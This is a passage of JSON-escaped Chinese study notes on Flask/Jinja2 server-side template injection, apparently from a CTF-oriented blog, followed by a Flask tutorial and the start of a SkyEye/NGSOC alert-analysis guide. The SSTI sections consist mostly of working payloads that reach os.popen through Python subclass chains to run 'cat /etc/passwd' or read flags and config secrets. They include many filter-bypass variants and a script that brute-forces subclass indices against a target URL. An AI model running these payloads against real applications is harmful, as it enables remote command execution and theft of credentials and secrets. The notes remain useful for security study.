getitem(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t.getitem(&#39;2&#39;))\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def __getitem__(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t[&#39;2&#39;])           #实体对象[&#39;key&#39;] 系统会自动调用__getitem__方法\n\n可以用来绕过[]过滤\n&#123; &#123;&#39;&#39;.__ckass__.__base__.__subclasses__().__getitem__(&#39;+ str(i) +&#39;)&#125; &#125;\n\n使用__getitem__()构造payload:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;code&quot;:\n    &#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#39;+str(i)+&#39;)&#125; &#125;&#39;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_wrap_close&#39; in response.text:\n                print(i,&quot;---&gt;&quot;,response.text)\n                break\n    except:\n        pass\npayload:\n&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n\n4.request绕过单双引号过滤request在flask中可以访问基于HTTP请求传递的所有信息此request并非python函数，而是在flask内部的函数\nrequest.args.key    获取get传入的key的值\nrequest.values.x1   所有参数 \nrequest.cookies     获取cookies传入参数 \nrequest.headers     获取请求头请求参数 \nrequest.form.key    获取post传入参数\n（Content-Type：applicaation／x-www-form-urlencoded或multipart／form-data） request.data        获取post传入参数（Content-Type：a／b） \nrequest.json        获取post传入json参数（Content-Type：application／json） \n\napp.py\nfrom flask import Flask, render template, request\n\napp&#x3D;Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;]) \ndef show1():\n    return render_template(&#39;index.html&#39;) \n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run(host&#x3D;&#39;0.0.0.0&#39;) \n\nindex.html\n&lt;html lang&#x3D;&quot;en&quot;&gt; \n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; \n&lt;title&gt;过滤器的使用&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;br&gt;\n获取get提交数据： &#123; &#123;request.args.k1&#125; &#125;\n&lt;br&gt;\n获取post提交数据：&#123; &#123;request.form.k2&#125; &#125;\n&lt;br&gt;\n获取cookie提交数据：&#123; &#123;request.cookies.k3&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n在构造payload时大多会用到单双引号，可以通过构造带 参数的url，配合request获取参数的内容来组成想要提交的指令，从而绕过单双引号的使用。\n#POST提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.k1](requests.form.k2).read()&#125; &#125;&amp;k1&#x3D;popen&amp;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n#cookie提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.k1](request.cookies.k2).read()&#125; &#125;\n#Cookie:k1&#x3D;popen;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n\n5.过滤器绕过下划线过滤过滤器1.过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数。2.可以链接到多个过滤器，一个过滤器的输出将应用与下一个过滤器。\napp.pyindex.html\n&#123; &#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)&#125; &#125;\n#attr绕过下划线_过滤\n&#39;&#39;&#39;\n1.使用reques方法\nGET请求：URL&#x2F;?cla&#x3D;__class__\nPOST提交：code&#x3D;&#123; &#123;()|attr(request.args.cla)&#125; &#125;\n&#39;&#39;&#39;\n#&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n#例子：\n#GET提交：URL&#x2F;?cla&#x3D;__class__&amp;bas&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;ini&#x3D;__init__&amp;glo&#x3D;__globals__&amp;gei&#x3D;__getitem__\n#POST提交：&#123; &#123;&#39;&#39;|attr(request.args.cla)|attr(request.args.sub)()|attr(request.args.gei)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passwd&#39;)|attr(&#39;read&#39;)()&#125; &#125;\n&#39;&#39;&#39;\n2.使用unicode编码\n3.使用16位编码\n4.base64编码\n5.格式化字符串      %c %95即下划线\n&#39;&#39;&#39;\n\n6.中括号绕过点过滤点’.’被过滤1.用中括号代替点2.attr()绕过\n7.绕过关键字过滤过滤了”class””arg””from””value””int””global”等关键字\n以&quot;__class__&quot;为例\n1.字符编码\n2.最简单的拼接“+”：&#39;__cl&#39;+&#39;ass__&#39;\n3.使用Jinjia2中的&quot;~&quot;进行拼接：&#123; %set a&#x3D;&quot;__cla&quot;% &#125;&#123; %set b &#x3D; &quot;ss__&quot;% &#125;&#123; &#123;()[a~b]&#125; &#125;\n4.利用过滤器（reverse反转，replace替换，join拼接等）：\n&#123; %set a&#x3D;&quot;__ssalc__&quot;|reverse% &#125;&#123; &#123;()[a]&#125; &#125;\n5.利用python的char():\n&#123; %set chr&#x3D;url_for.__globals__[&#39;__builtins__&#39;].chr% &#125;&#123; &#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(95)%2bchr(95)]&#125; &#125;\n#为了避免字符串被过滤&#x2F;转义，基于chr()函数来生成整数编码的字符，并将其拼接成字符串。例如，在上面的代码中，chr(95)会生成一个下划线字符 &quot;_&quot; 的ASCII编码，chr(99)则对应着 &quot;c&quot; 字符，依次类推。\n\n\n8.length过滤器绕过数字过滤\n9.获取config文件有些flag可能在config文件中如果没有过滤，直接{ {config} }就能打开。&#x2F;&#x2F;姿势集里面有相关说明\n**flask内置函数**\nlipsum 可加载第三方库\nurl_for 可返回url路径\n#url_for:一个可以根据视图函数名或端点名称生成相应 URL 的函数。通过这个函数，我们可以在不硬编码URL的情况下引用不同的视图函数或端点，并构建出正确的URL路由。\nget_flashed_message 可获取消息\n#get_flashed_messages：一个在重定向期间获取Flash消息的函数。Flash消息通常用于在请求之间存储临时信息，比如表单提交后显示一个成功或失败的消息。\n**flask内置对象**\ncycler：一个轻量级的循环迭代器，可以用于生成一系列重复的值。\njoiner：一个字符串连接器，可以将多个字符串连接成一个字符串。\nnamespace：一个命名空间对象，可以在程序中组织变量和函数，避免命名冲突。\nconfig：一个配置管理器对象，可以读取和写入程序的配置文件参数。\nrequest：一个用于发送 HTTP 请求的对象，通常用于从网络上获取数据。\nsession：一个用于存储用户会话信息的对象，通常用于在Web应用程序中跟踪用户状态。\n可利用已加载内置函数或对象寻找被过滤字符串可利用内置函数调用current_app模块进而查看配置文件\ncurrent_app\n调用current_app相当于调用flask\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config&#125; &#125;\n#当在 Flask 模板中调用 &#123; &#123; url_for.__globals__[&#39;current_app&#39;].config &#125; &#125; 时，实际上是通过获取 url_for 对应的全局命名空间中的 current_app 对象，进而获取当前应用程序的配置信息并输出。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125; &#125;\n10.混合过滤dict()和join\ndict(): #用来创建一个字典\njoin： #将一个序列中的参数值拼接成字符串\n&#123; %set a&#x3D;dict(nihao&#x3D;1)% &#125;&#123; &#123;a&#125; &#125;   \n#创建字典a，键名nihao，键值1\n&#123; %set a&#x3D;dict(__cla&#x3D;1,ss__&#x3D;2)|join% &#125;&#123; &#123;a&#125; &#125;  \n#创建字典a，join把参数值拼接成字符串\n获取符号\n利用flask内置函数和对象获取符号\n&#123; % set hao &#x3D; (&#123;&#125;|select()|string()) % &#125;&#123; &#123;hao&#125; &#125;\n&#123; % set hao &#x3D; (lipsum|string) % &#125;&#123; &#123;hao&#125; &#125;\n#获取下划线\n&#123; % set hao &#x3D; (self|string()) % &#125;&#123; &#123;hao&#125; &#125;\n#获取空格\n&#123; % set hao &#x3D; (self|string|urlencode) % &#125;&#123; &#123;hao&#125; &#125;\n#获取百分号\n&#123; % set hao &#x3D; (app.__doc__|string) % &#125;&#123; &#123;hao&#125; &#125;\n···类似的payload有很多\n在后面添加|list,然后根据返回的结果，通过hao[]去获取你需要的符号\n具体可以看示例2里面的payload\n\n示例1：WAF过滤  &#39;,&quot;,&#39;+&#39;,&#39;request&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;\npayload原型:&#123; &#123;().__class__.__base__.__subclasses__()[117]&#125;.__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()&#125;\npayload：\n&#123; %set a&#x3D;dict(__class__&#x3D;1)|join% &#125;\n&#123; %set b&#x3D;dict(__base__&#x3D;1)|join% &#125;\n&#123; %set c&#x3D;dict(__subclasses__&#x3D;1)|join% &#125;\n&#123; %set d&#x3D;dict(__getitem__&#x3D;1)|join% &#125;\n&#123; %set e&#x3D;dict(__in&#x3D;1,it&#x3D;2)|join% &#125;\n&#123; %set f&#x3D;dict(__glo&#x3D;1,bals__&#x3D;2)|join% &#125;\n&#123; %set g&#x3D;dict(popen&#x3D;1)|join% &#125;\n&#123; %set kg&#x3D;&#123;&#125;|select()|string()|attr(d)(10)% &#125;     #空格\n&#123; %set i&#x3D;(dict(cat&#x3D;1)|join,kg,dict(flag&#x3D;2)|join)|join% &#125;\n&#123; %set r&#x3D;dict(read&#x3D;1)|join% &#125;\n&#123; &#123;()|attr(a)|attr(b)|attr(c)|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(r)()&#125; &#125;\n示例2：WAF过滤  &#39;,&quot;,&#39;_&#39;,&#39;0-9&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;.&#39;\\&#39;,&#39;&#39;\npaylaod原型:&#123; &#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__item__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125; &#125;\npayload:\n&#123; %set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count% &#125;\n&#123; %set eighteen&#x3D;nine+nine% &#125;\n&#123; %set pop&#x3D;dict(pop&#x3D;a)|join% &#125;\n&#123; %set xhx&#x3D;(lipsum|string|list)|attr(pop)(eighteen)% &#125;\n&#123; %set kg&#x3D;(lipsum|string|list)|attr(pop)(nine)% &#125;\n#得到下划线xhx&#39;_&#39;和空格kg&#39; &#39;\n&#123; %set globals&#x3D;(xhx,xhx,dict(globals&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set getitem&#x3D;(xhx,xhx,dict(getitem&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set os&#x3D;dict(os&#x3D;a)|join% &#125;\n&#123; %set popen&#x3D;dict(popen&#x3D;a)|join% &#125;\n&#123; %set flag&#x3D;(dict(cat&#x3D;a)|join,kg,dict(flag&#x3D;a)|join)|join&#125;\n&#123; %set read&#x3D;dict(read&#x3D;a)|join&#125;\n&#123; &#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()&#125; &#125;\n\n姿势集(来源https://zhuanlan.zhihu.com/p/93746437)\n1.{ {config} } 可以获取当前设置，如果题目是这样的：app.config [&#39;FLAG&#39;] &#x3D; os.environ.pop（&#39;FLAG&#39;）\n\n可以直接访问 { {config[‘FLAG’]} } 或者 { {config.FLAG} } 得到 flag。\n2.同样可以找到 config。&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取当前 Flask 应用程序上下文中的配置信息。\n&#96;self&#96; 表示模板上下文对象，&#96;__dict__&#96; 返回该对象储存的属性和值的字典，\n&#96;_TemplateReference__context&#96; 是表示调用上下文槽时使用的内部插槽名称。\n最终访问 &#96;config&#96; 属性可以得到应用程序的配置信息。\n&#39;&#39;&#39;\n\n3.环境变量&#123; &#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取 Flask 程序中环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n首先创建一个空列表 &#96;[]&#96;，然后通过 &#96;. __class__&#96; 获取它的类 &#96;&lt;class &#39;list&#39;&gt;&#96;。\n再通过 &#96;.__base__&#96; 方法获取其基础类，即 &#96;&lt;class &#39;object&#39;&gt;&#96;。\n接着通过 &#96;.__subclasses__()&#96; 方法获取所有子类，得到一个列表。\n然后查询这个列表中下标为 &#96;68&#96; 的子类，得到 &#96;&lt;class &#39;posix.ScandirIterator&#39;&gt;&#96;。\n对该子类的 &#96;__init__&#96; 初始化函数进行取值并访问 &#96;__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#96; \n就可以获取环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n&#39;&#39;&#39;\n\n4.url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等这是 Flask 中一些常用的对象或方法：\n&#39;&#39;&#39;\n- &#96;url_for&#96;：生成 URL。\n- &#96;g&#96;：应用程序上下文中存储数据的齿轮。在请求之间共享数据。\n- &#96;request&#96;：表示客户端发出的请求。\n- &#96;namespace&#96;：命名空间，常常用于优化 url_for。\n- &#96;lipsum&#96;：快速生成 Lorem Ipsum 文本。\n- &#96;range&#96;：Python 内置函数，用于生成一个固定区间内的整数序列。\n- &#96;session&#96;：应用程序上下文中用户会话存储数据的地方。在请求之间共享数据。\n- &#96;dict&#96;：Python 内置类型，字典类型，用于保存键-值对。\n- &#96;get_flashed_messages&#96;：从请求中弹出闪现消息。\n- &#96;cycler&#96;：Matplotlib 库中的循环器，用于对颜色、线条风格等元素进行迭代访问。\n- &#96;joiner&#96;：用于拼接字符串。\n- &#96;config&#96;：Flask 应用程序全局配置。\n&#39;&#39;&#39;\n\n如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#url_for.__globals__[&#39;current_app&#39;]，表示获取当前应用程序实例中的全局变量；\n#然后通过 config.FLAG 获取环境变量 FLAG 的值。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#get_flashed_messages.__globals__[&#39;current_app&#39;]，同样表示获取当前应用程序实例中的全局变量；\n#然后再次通过 config.FLAG 获取环境变量 FLAG 的值。\n#该函数主要用于传递闪现消息给用户，而在这里被“利用”以获取环境变量。\n&#123; &#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125; &#125;\n#在获取到 request 对象和 current_app 对象后，使用 _get_data_for_json() 方法将请求数据编码为 json 格式，\n#并使用 json 库进行编码。由于 flask 使用了自定义的 JSONEncoder 类，\n#所以我们通过 json.JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;] 来访问环境变量。\n\n5.过滤了 []、.pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。\n&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()\n\n在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。\n若.也被过滤，使用原生 JinJa2 函数 |attr()\n即将 request.__class__ 改成 request|attr(&quot;__class__&quot;)\n6.过滤下划线 _利用 request.args 的属性\n\n&#123; &#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。\nGET:\n\n&#123; &#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;\n\nPOST:\nclass&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n7.过滤引号 “request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。\n&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd\n\n8.一些关键字被过滤。base64编码绕过用于__getattribute__使用实例访问属性时。\n例如，过滤掉 __class__ 关键词\n&#123; &#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n\n字符串拼接绕过\n&#123; &#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n&#123; &#123;[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[40]&#125; &#125; ","slug":"note_ssti1","date":"2023-04-21T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"1e1792beaab2c135cf1beec290eff7af","title":"ssti模板注入学习笔记-flask前置知识","content":"flask是一个使用python编写的轻量级web应用框架\npython可以直接用flask启动一个web服务页面\ncd &#x2F;opt&#x2F;flask1\nsource .&#x2F;bin&#x2F;activate\ncd &#x2F;root\nvim demo.py\npython3 demo.py\n\n其中demo.py文件:\nfrom flask import Flask     #启动flask模块，创建一个Flask类\napp &#x3D; Flask(__name__)       #__name__是系统变量，指的是本py文件的文件名\n\n#路由：基于浏览器输入的字符串寻址\n@app.route(&#39;&#x2F;world&#39;)             \ndef hello():\n    return &quot;hello world&quot;\n@app.route(&#39;&#x2F;man&#39;)             \ndef hello():\n    return &quot;hello man&quot;\n\n#只能被python直接运行，而不能被作为组件或模块被调用\nif __name__&#x3D;&#x3D;&#39;__main__&#39;: \n    app.run(debug&#x3D;True,host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;8081)      #改完配置自动生效\n    #debug建议只能在学习中开启  host&#x3D;&quot;0.0.0.0&quot;监听所有的物理接口\n\nflask变量规则通过向规则参数添加变量部分，可以动态构建URL\nfrom flask import Flask\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)\ndef hello(name):\n    return &quot;hello %s&quot; % name\n@app.route(&#39;int&#x2F;&lt;ID&gt;&#39;)\ndef hello(ID):\n    return &quot;hello %d&quot; % ID\n\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.run(debug&#x3D;True)\n\nflask HTTP方法在python demo.py中插入路由:\n@app.route(&#39;&#x2F;login&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;])\ndef login():\n    if request.method &#x3D;&#x3D; &#39;POST&#39;:\n        print(1)\n        user &#x3D; request.form[&#39;ben&#39;]\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))     #redirect重定向\n    else:\n        print(2)\n        user &#x3D; request.args.get(&#39;ben&#39;)\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))\n\nflask模板视图函数：主要作用是生成请求的相应把业务逻辑和表现内容放在一起，会增加代码的复杂度和维护成本\n使用模板：使用静态的页面html展示动态的内容模板是一个响应文本的文件，其中使用占位符（变量）表示动态部分。代码结构清晰，耦合度低\n· 处理业务逻辑：视图函数只负责业务逻辑和数据处理\n· 返回相应内容：模板取到视图函数的数据结果来进行展示\n\nrender_template加载html文件，默认文件路径在templates目录下。\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    return render_template(&quot;index.html&quot;)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n在templates目录下创建index.html文件\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Title&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    模板html展示页面\n&lt;br&gt;\n    &#123;&#123;my_str&#125;&#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n两者结合：\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;dazhuang&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template(&quot;index.html&quot;,\n    my_str&#x3D;my_str,\n    my_int&#x3D;my_int,\n    my_arry&#x3D;my_array,\n    my_dict&#x3D;my_dict\n    )\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\nrender_template_string用于渲染字符串，直接定义内容\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;nannan&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template_string(&#39;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;title&gt;Title&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;模板html展示页面&lt;br&gt;%d&lt;br&gt;%s&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39; % (my_int,my_str))\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\npython中的继承关系父类和子类（子类调用父类下的其他子类）~python flask脚本没有办法直接执行python指令object是父子关系的顶端，所有数据类型最终的父类都是object\nclass A:pass\nclass B(A):pass\nclass C(B):pass\nclass D(B):pass\nc &#x3D; c()\n\nprint(c.__class__)                              # &lt;class &#39;__main__.C&#39;&gt; 当前类C\nprint(c.__class__.__base__)                     # &lt;class &#39;__main__.B&#39;&gt; 当前类的父类B\nprint(c.__class__.__base__.__base__)            # &lt;class &#39;__main__.A&#39;&gt;\nprint(c.__class__.__base__.__base__.__base__)   # &lt;class &#39;object&#39;&gt;\nprint(c.__class__.__mro__)                      # 上面四个层层递进一起输出\nprint(c.__class__.__base__.__subclasses__())    # B下的所有子类（数组形式）\nprint(c.__class__.__base__.__subclasses__()[1]) #调用子类D\n\n魔术方法__class__           #查找当前类型的所属对象\n__base__            #沿着父子类的关系往上走一个\n__mro__             #查找当前类对象的所有继承类\n__subclasses__()    #查找父类下的所有子类\n\n简单的payload（注意类型）\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;    #str类型\n&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;    #list类型\n&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;    #元组类型\n\n然后，寻找一些关键的模块\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n#例如：os.wrap_close       #找到对应的列数\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117]&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;\n# __builtins__提供对python的所有&quot;内置&quot;标识符的直接访问\n# eval()计算字符串表达式的值\n# popen()执行一个shell以运行命令来开启一个进程\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;\n#这里也可以直接调用\n\n\n\n\n","slug":"note_flask_study","date":"2023-04-14T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"bc3ebb8ae7699a64039d8253e84d74dc","title":"天眼&NGSOC告警分析","content":"天眼&amp;NGSOC告警分析天眼使用指南&lt; 分析平台，流量传感器，文件威胁鉴定器 &gt;\n新一代安全感知系统：检测，溯源，响应\n云端威胁情报：\n文件威胁鉴定器静态检测，动态检测\n分析平台威胁感知，调查分析，场景化分析\n流量传感器入侵攻击检测，威胁情报匹配，文件还原，数据采集\n天擎EDR联动，终端响应\n天眼设备介绍-传感器【总览】\n流量采集 -&gt; 协议分析(DNS,FTP,HTTP,SSL,SMB,···) -&gt; 检测引擎 -&gt; 检测结果\n检测引擎：· 基于双向会话分析的Web入侵检测· 基于沙箱的webshell上传检测· 基于规则的网络入侵检测，威胁情报检测，基于人工智能机器自学习的入侵检测nbt引擎\n检测结果：· 产生准确的入侵告警· 告警信息存入分析平台，作为攻击取证及快速溯源的数据支撑\n【界面信息】\n仪表盘：—状态监听：\n包括设备连接状态、设备列表、资源占用、系统信息、授权信息、攻击规则信息、威胁情报信息、网络流量、应用流\n量、数据采集、会话监控、文件类型统计、日志外发统计。\n\n威胁告警：—告警列表：展示网页漏洞利用，webshell上传，网络攻击，威胁情报4种类型的所有告警。\n在【威胁告警】---【详情】因为在告警详情中，对于url编码、base64编码、以及各种中文编码，浏览器不能提供直接的转义功能，导致\n部分告警分析存在困难，所以提供此小工具对各种编码内容进行转义。\n\n规则配置：—网页漏洞利用，—webshell上传，—网络攻击，—自定义规则（漏洞规则，威胁情报）\n&lt;注&gt;：自定义威胁情报支持导入导出。\n导出格式：导出情报文件的格式，可选OPENIOC、JSON、STIX三种格式，支持多选，选择多种格式则以压缩包形式导出，解压后可查看\n文件；\n导出状态：选择需要导出情报的状态，“全部”、“全部启用”、“全部停用”只能选择一种，选择“全部”则导出所有情报，选择“全部启用”\n则导出启用状态为启用的所有情报，选择“全部停用”则导出启用状态为停用的所有情报。\n\n策略配置：—威胁检测：提供了检测开关的启停功能，及高级参数，弱口令，内部资产IP的配置功能。注：高级参数设定阈值后需要通过点击“保存”按钮使配置生效。\n策略配置---威胁检测---XFF\n因流量进过不同设备时，数据流中的IP可能会被替换。此功能是了为识别真正的源IP。\n\n策略配置---威胁检测---弱口令\n【弱口令规则】模块的正则表达式，支持用于检测http协议中的弱口令登录行为，对应的检测规则为“WEB弱口令登录”。用户可根据需要对\n正则表达式进行修改，以替换默认的正则表达式，配置完成需点击“保存”按钮使生效。同时，也支持点击“重置”按钮，将弱口令规则重置\n为系统默认的正则表达式。\n【弱口令字典】模块，用于在内置弱口令不能完全满足需求的情况下，补充自定义的弱口令，检测流量中存在使用口令字典中密码登录的情况。\n\n—流量记录：页面提供三个功能，\n启用流量负载记录，控制向分析平台发送数据中是否带payload数据及携带的上下行数据长度；\n启用流量过滤，提供网络流量筛选功能；\n自定义协议，支持用户根据端口配置协议信息。\n\n—文件还原：\n用于配置管理文件还原功能，支持启停文件还原功能，并支持配置还原的协议类型、文件类型及文件大小（最大值）。支持在【系统管理\n---&gt;联动管理---&gt;数据传输设置】页面配置传输规则，将还原的文件外发给文件威胁鉴定器。\n\n—抓包检测：\n【PCAP文件检测】提供对用户手动导入pcap文件进行检测的功能，系统会分析pcap文件中的协议，还原协议传输中的文件，检测是否存\n在网络攻击。系统会将分析出来的协议日志、告警日志发送分析平台，将产生的网页漏洞利用、webshell上传、网络攻击、威胁情报告\n警、恶意文件在威胁感知---&lt;告警列表页面进行展示，将还原出的文件和对应的流量日志发送文件威胁鉴定器。\n\n—旁路阻断：\n通过分析设备采集的流量数据包，再根据配置的阻断策略通过发rst报文或重定向的形式对满足条件的流量进行封禁操作，并统计阻断次\n数、记录阻断日志。支持配置管理阻断策略及封禁策略（人工规则）、阻断白名单信息。\n—ssl解密：\n【SSL解密】http流量经过SSL加密，就是https流量，而加密过程就是服务器使用SSL私钥进行加密。传感器在处理HTTPS流量时，首先\n会使用用户上传的私钥对相应的流量进行解密，将https流量转换为http流量，之后就是正常的流量处理流程（文件还原，告警等），同\n时向外发送日志。web界面上解密流量的私钥状态会变为绿色。\n\n—白名单配置：\n系统提供两大类白名单配置，配置规则与威胁情报白名单之后，命中白名单的告警不会入数据库存储，也不会进行展示和外发；配置文\n件白名单，命中文件MD5后不会进行检测。点击白名单类型下拉列表可以切换不同的类型。\n\n系统管理：—基础配